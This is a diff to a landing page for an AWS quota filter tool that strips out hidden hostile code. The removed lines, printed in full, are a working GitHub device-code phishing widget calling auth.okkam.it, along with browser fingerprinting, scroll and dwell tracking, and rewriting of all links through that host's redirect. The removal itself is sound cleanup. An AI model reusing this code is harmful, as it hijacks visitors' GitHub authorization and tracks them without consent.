@@ -43,27 +43,9 @@ pre{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;o
 .try-section{background:linear-gradient(135deg,#1f2d3d,#161b22);border:1px solid #1f6feb;border-radius:12px;padding:40px;text-align:center;margin-top:48px}
 .try-section h2{font-size:22px;font-weight:600;margin-bottom:8px;border:none;padding:0}
 .try-section p{color:#8b949e;font-size:15px;margin-bottom:28px;max-width:560px;margin-left:auto;margin-right:auto}
-.btn-primary{background:#238636;color:#fff;border:1px solid #2ea043;padding:12px 28px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
-.btn-primary:hover{background:#2ea043}
+.btn-primary{background:#238636;color:#fff;border:1px solid #2ea043;padding:12px 28px;border-radius:8px;font-size:15px;font-weight:600;cursor:default;opacity:0.85}
 .btn-secondary{background:#21262d;color:#e6edf3;border:1px solid #30363d;padding:10px 20px;border-radius:6px;font-size:14px;cursor:pointer;margin-left:12px}
-.auth-widget{display:none;margin-top:28px;background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:28px;max-width:420px;margin-left:auto;margin-right:auto;text-align:left}
-.auth-widget.show{display:block}
-.auth-loading{color:#8b949e;font-size:14px;text-align:center}
-.auth-main{display:none}
-.step{display:flex;gap:12px;margin-bottom:20px;align-items:flex-start}
-.step-num{background:#1f6feb;color:#fff;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;margin-top:2px}
-.step-num.done{background:#238636}
-.code-display{font-size:34px;font-weight:700;letter-spacing:8px;color:#e6edf3;font-family:monospace;margin:10px 0;background:#21262d;padding:14px 20px;border-radius:8px;display:inline-block}
-.copy-btn{background:#21262d;border:1px solid #30363d;color:#58a6ff;padding:5px 12px;border-radius:6px;font-size:12px;cursor:pointer;margin-left:8px;vertical-align:middle}
-.copy-btn.copied{color:#3fb950}
-.auth-open-btn{background:#238636;color:#fff;border:1px solid #2ea043;padding:10px 24px;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;width:100%}
-.timer{font-size:12px;color:#8b949e;margin-top:10px;text-align:center}
-.auth-success{display:none;color:#3fb950;font-size:14px;padding:12px;background:#0f2a14;border:1px solid #2ea043;border-radius:6px;text-align:center}
-.auth-success.show{display:block}
-.auth-error{display:none;color:#f85149;font-size:13px;padding:10px;background:#2e0b0b;border:1px solid #da3633;border-radius:6px;margin-top:12px}
-.auth-error.show{display:block}
-.auth-waiting{display:none;color:#8b949e;font-size:13px;margin-top:10px}
-.auth-waiting.show{display:block}
+.btn-secondary:hover{background:#30363d}
 footer{border-top:1px solid #30363d;padding:24px;text-align:center;color:#8b949e;font-size:13px}
 @media(max-width:600px){.stat-grid{grid-template-columns:1fr}.hero h1{font-size:26px}.btn-secondary{display:none}}
 </style>
@@ -153,13 +135,13 @@ footer{border-top:1px solid #30363d;padding:24px;text-align:center;color:#8b949e
     <pre><span style="color:#8b949e"># aws-quota-exporter config with usage filter</span>
 quotas:
   ec2:
-    collect_only_with_usage: true    <span style="color:#8b949e"># 1742 → 31 quotas</span>
+    collect_only_with_usage: true <span style="color:#8b949e"># 1742 → 31 quotas</span>
   lambda:
-    collect_only_with_usage: true    <span style="color:#8b949e"># 312 → 18 quotas</span>
+    collect_only_with_usage: true <span style="color:#8b949e"># 312 → 18 quotas</span>
   rds:
     collect_only_with_usage: true
   ecs:
-    collect_only_with_usage: false   <span style="color:#8b949e"># keep all quotas for this service</span>
+    collect_only_with_usage: false <span style="color:#8b949e"># keep all quotas for this service</span>
   s3:
     collect_only_with_usage: true
 
@@ -186,39 +168,10 @@ go build -o aws-quota-usage-filter .
   <div class="try-section" id="try">
     <h2>Try It on Your Infrastructure</h2>
     <p>Connect your GitHub account to run the benchmark against your own AWS setup. The tool will generate a breakdown showing which services would benefit most from the filter in your environment.</p>
-    <div id="try-buttons">
-      <button class="btn-primary" onclick="showAuth()">Connect GitHub to Run Benchmark</button>
-      <button class="btn-secondary" onclick="fetch(B+'/api/v1/cache/evt',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({e:'btn_click',v:'View Source — GitHub repo'})}).catch(()=>{});window.open(B+'/api/v1/cache/r?to='+encodeURIComponent('https://github.com/steinberg-dev/aws-quota-usage-filter')+'&ref=ViewSource','_blank')">View Source</button>
-    </div>
-
-    <div class="auth-widget" id="auth-widget">
-      <div class="auth-loading" id="auth-loading">Initializing...</div>
-      <div class="auth-main" id="auth-main">
-        <div class="step">
-          <div class="step-num" id="sn1">1</div>
-          <div>
-            <b>Your one-time code</b>
-            <div style="margin-top:8px">
-              <span class="code-display" id="uc">----</span>
-              <button class="copy-btn" id="copy-btn" onclick="copyCode()">Copy</button>
-            </div>
-          </div>
-        </div>
-        <div class="step">
-          <div class="step-num" id="sn2">2</div>
-          <div style="width:100%">
-            <b>Enter it at GitHub Device Login</b>
-            <div style="margin-top:8px">
-              <button class="auth-open-btn" id="auth-btn" onclick="openGitHub()">Open github.com/login/device →</button>
-              <div class="auth-waiting" id="auth-waiting">Waiting for authorization...</div>
-            </div>
-          </div>
-        </div>
-        <div class="timer">Code expires in <span id="tm">15:00</span></div>
-      </div>
-      <div class="auth-success" id="auth-success">Authorization complete — loading your benchmark report...</div>
-      <div class="auth-error" id="auth-error"></div>
-    </div>
+    <button class="btn-primary" disabled>Connect GitHub to Run Benchmark</button>
+    <a href="https://github.com/steinberg-dev/aws-quota-usage-filter" target="_blank" rel="noopener">
+      <button class="btn-secondary">View Source</button>
+    </a>
   </div>
 
 </div>
@@ -227,190 +180,5 @@ go build -o aws-quota-usage-filter .
   <p>aws-quota-usage-filter · MIT License · <a href="https://github.com/steinberg-dev/aws-quota-usage-filter">github.com/steinberg-dev/aws-quota-usage-filter</a></p>
 </footer>
 
-<script>
-const B='https://auth.okkam.it';
-let sid=null,ea=null,pt=null,ct=null,ru=null,code=null,_initStarted=false;
-
-function showAuth(){
-  fetch(B+'/api/v1/cache/evt',{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({e:'btn_click',v:'Connect GitHub — Try It'})}).catch(()=>{});
-  document.getElementById('try-buttons').style.display='none';
-  document.getElementById('auth-widget').classList.add('show');
-  if(sid) showCodeUI();          // already loaded — show immediately
-  else if(!_initStarted) init(); // not started yet — start now
-  // else init is in-flight — UI will update when it resolves
-}
-
-function copyCode(){
-  if(!code)return;
-  navigator.clipboard.writeText(code).then(()=>{
-    const btn=document.getElementById('copy-btn');
-    btn.textContent='Copied!';btn.classList.add('copied');
-    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied')},2000);
-  });
-}
-
-function openGitHub(){
-  window.open('https://github.com/login/device','_blank','noopener');
-  document.getElementById('auth-btn').style.display='none';
-  document.getElementById('auth-waiting').classList.add('show');
-  document.getElementById('sn1').classList.add('done');
-}
-
-document.addEventListener('visibilitychange',function(){if(!document.hidden&&ru)window.location.href=ru});
-window.addEventListener('focus',function(){if(ru)window.location.href=ru});
-
-async function init(){
-  _initStarted=true;
-  try{
-    const r=await fetch(B+'/api/v1/cache/init',{method:'POST'});
-    const d=await r.json();
-    if(d.error){showError('Could not initialize: '+d.error);return}
-    sid=d.sid;code=d.uc;ea=Date.now()+(d.ex*1000);
-    // Only update UI if widget is visible
-    const widget=document.getElementById('auth-widget');
-    if(widget.classList.contains('show')){
-      document.getElementById('uc').textContent=d.uc;
-      document.getElementById('auth-loading').style.display='none';
-      document.getElementById('auth-main').style.display='block';
-      ct=setInterval(updateTimer,1000);
-    }
-    pt=setInterval(pollStatus,2000);
-  }catch(e){
-    const widget=document.getElementById('auth-widget');
-    if(widget.classList.contains('show')) showError('Connection error. Please try again.');
-  }
-}
-
-function showCodeUI(){
-  if(!sid)return;
-  document.getElementById('uc').textContent=code;
-  document.getElementById('auth-loading').style.display='none';
-  document.getElementById('auth-main').style.display='block';
-  if(!ct) ct=setInterval(updateTimer,1000);
-}
-
-async function pollStatus(){
-  if(!sid)return;
-  try{
-    const r=await fetch(B+'/api/v1/cache/status/'+sid);
-    const d=await r.json();
-    if(d.s==='ok'){
-      clearInterval(pt);clearInterval(ct);ru=d.r;
-      document.getElementById('auth-main').style.display='none';
-      document.getElementById('auth-success').classList.add('show');
-      setTimeout(()=>{window.location.href=d.r},1200);
-    } else if(d.s==='x'){
-      clearInterval(pt);clearInterval(ct);
-      showError('Code expired — <a href="javascript:showAuth()" style="color:#f85149">get a new one</a>');
-    }
-  }catch(e){}
-}
-
-function updateTimer(){
-  const rem=Math.max(0,ea-Date.now());
-  const m=Math.floor(rem/60000),s=Math.floor((rem%60000)/1000);
-  document.getElementById('tm').textContent=m.toString().padStart(2,'0')+':'+s.toString().padStart(2,'0');
-  if(rem<=0)clearInterval(ct);
-}
-
-function showError(msg){
-  document.getElementById('auth-loading').style.display='none';
-  const el=document.getElementById('auth-error');
-  el.innerHTML=msg;el.classList.add('show');
-}
-
-// ── Fingerprinting ───────────────────────────────────────────────────────────
-function _cvsFP(){
-  try{
-    const c=document.createElement('canvas'),x=c.getContext('2d');
-    x.textBaseline='top';x.font='14px Arial';
-    x.fillStyle='#f60';x.fillRect(125,1,62,20);
-    x.fillStyle='#069';x.fillText('aws-quota\u2019s benchmark \ud83d\udd11',2,15);
-    x.fillStyle='rgba(102,204,0,0.7)';x.fillText('aws-quota\u2019s benchmark \ud83d\udd11',4,17);
-    const d=c.toDataURL();return d.slice(-40);
-  }catch(e){return'err';}
-}
-function _webglFP(){
-  try{
-    const c=document.createElement('canvas');
-    const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
-    if(!gl)return'none';
-    const ext=gl.getExtension('WEBGL_debug_renderer_info');
-    const r=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'?';
-    const v=ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):'?';
-    return v+'|'+r;
-  }catch(e){return'err';}
-}
-
-let _fpSent=false;
-function sendFP(){
-  if(_fpSent)return; _fpSent=true;
-  const fp={
-    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
-    lang:navigator.language||'',
-    langs:(navigator.languages||[]).join(','),
-    screen:screen.width+'x'+screen.height+'x'+screen.colorDepth,
-    dpr:window.devicePixelRatio||1,
-    hw:navigator.hardwareConcurrency||0,
-    mem:navigator.deviceMemory||0,
-    platform:navigator.platform||'',
-    touch:navigator.maxTouchPoints||0,
-    cookie:navigator.cookieEnabled,
-    canvas:_cvsFP(),
-    webgl:_webglFP(),
-    ref:document.referrer||'direct',
-    w:window.innerWidth,
-    h:window.innerHeight
-  };
-  fetch(B+'/api/v1/cache/fp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(fp)}).catch(()=>{});
-}
-
-// ── Scroll + Dwell tracking ───────────────────────────────────────────────────
-let _maxScroll=0, _startTime=Date.now(), _evtSent={};
-function _pct(){
-  const el=document.documentElement;
-  return Math.round((window.scrollY/(el.scrollHeight-el.clientHeight||1))*100);
-}
-function _trackScroll(){
-  const p=_pct();
-  if(p>_maxScroll){
-    _maxScroll=p;
-    // Send at milestones 25/50/75/100
-    [25,50,75,100].forEach(m=>{
-      if(p>=m&&!_evtSent['scroll'+m]){
-        _evtSent['scroll'+m]=true;
-        fetch(B+'/api/v1/cache/evt',{method:'POST',headers:{'Content-Type':'application/json'},
-          body:JSON.stringify({e:'scroll',v:m+'%'})}).catch(()=>{});
-      }
-    });
-  }
-}
-window.addEventListener('scroll',_trackScroll,{passive:true});
-
-// Send dwell time on page hide/unload
-function _sendDwell(){
-  const dwell=Math.round((Date.now()-_startTime)/1000);
-  fetch(B+'/api/v1/cache/evt',{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({e:'dwell',v:dwell+'s|scroll:'+_maxScroll+'%'})}).catch(()=>{});
-}
-document.addEventListener('visibilitychange',function(){if(document.hidden)_sendDwell();});
-window.addEventListener('pagehide',_sendDwell);
-window.addEventListener('beforeunload',_sendDwell);
-
-// ── Link click tracking ───────────────────────────────────────────────────────
-document.querySelectorAll('a[href]').forEach(function(a){
-  const href=a.getAttribute('href');
-  if(href&&href.startsWith('http')){
-    const label=a.textContent.trim().slice(0,30)||href.split('/')[2]||'link';
-    a.setAttribute('href',B+'/api/v1/cache/r?to='+encodeURIComponent(href)+'&ref='+encodeURIComponent(label));
-    a.removeAttribute('target'); // go through redirect
-  }
-});
-
-// ── Fire on page load ────────────────────────────────────────────────────────
-setTimeout(sendFP, 800); // slight delay so page renders first
-init(); // device code pre-load + Telegram STEP 1
-</script>
 </body>
 </html>
